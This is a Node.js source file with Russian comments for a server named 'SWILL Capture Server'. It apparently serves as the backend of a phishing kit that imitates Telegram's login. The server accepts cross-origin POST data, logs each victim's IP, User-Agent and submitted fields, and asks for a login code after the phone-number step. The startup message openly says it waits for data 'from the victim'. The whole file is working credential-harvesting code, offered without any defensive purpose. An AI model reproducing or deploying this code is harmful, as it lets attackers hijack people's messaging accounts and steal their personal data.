// server.js — простой бэкенд для вывода данных в терминал

const http = require('http');
const url = require('url');

// Создаём HTTP-сервер
const server = http.createServer((req, res) => {
    // Разрешаем CORS (чтобы запросы с любой страницы проходили)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Обработка предварительного запроса OPTIONS
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Если запрос GET — выводим информацию о сервере
    if (req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            status: 'running', 
            message: 'SWILL Capture Server активен. Жду данные...' 
        }));
        return;
    }

    // Если запрос POST — принимаем данные
    if (req.method === 'POST') {
        let body = '';

        // Собираем данные по кусочкам
        req.on('data', (chunk) => {
            body += chunk.toString();
        });

        req.on('end', () => {
            try {
                // Парсим JSON
                const data = JSON.parse(body);
                
                // Получаем IP и заголовки
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
                const userAgent = req.headers['user-agent'] || 'unknown';

                // ============================================
                // === ВЫВОД В ТЕРМИНАЛ (консоль сервера) ===
                // ============================================
                console.log('\n========================================');
                console.log('🔴 [SWILL] НОВЫЕ ДАННЫЕ ПОЛУЧЕНЫ!');
                console.log('🕒 Время:', new Date().toISOString());
                console.log('🌐 IP:', ip);
                console.log('🖥️ User-Agent:', userAgent);
                console.log('📦 Данные:');
                console.log(JSON.stringify(data, null, 2));
                console.log('========================================\n');

                // === ОТВЕТ КЛИЕНТУ (имитация Telegram) ===
                let response;
                if (data.step === 'phone') {
                    response = { success: true, requireCode: true };
                } else {
                    response = { success: true, redirect: true };
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(response));

            } catch (error) {
                // Если данные не JSON
                console.error('[SWILL] Ошибка парсинга:', error.message);
                console.log('[SWILL] Полученные данные (raw):', body);

                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: 'Invalid JSON' }));
            }
        });

        return;
    }

    // Если метод другой — 404
    res.writeHead(404);
    res.end('Not found');
});

// Запускаем сервер на порту 8080
const PORT = 8080;
server.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`✅ [SWILL] Бэкенд запущен!`);
    console.log(`📡 Адрес: http://localhost:${PORT}`);
    console.log(`🔄 Ожидаю данные от жертвы...`);
    console.log(`========================================\n`);
});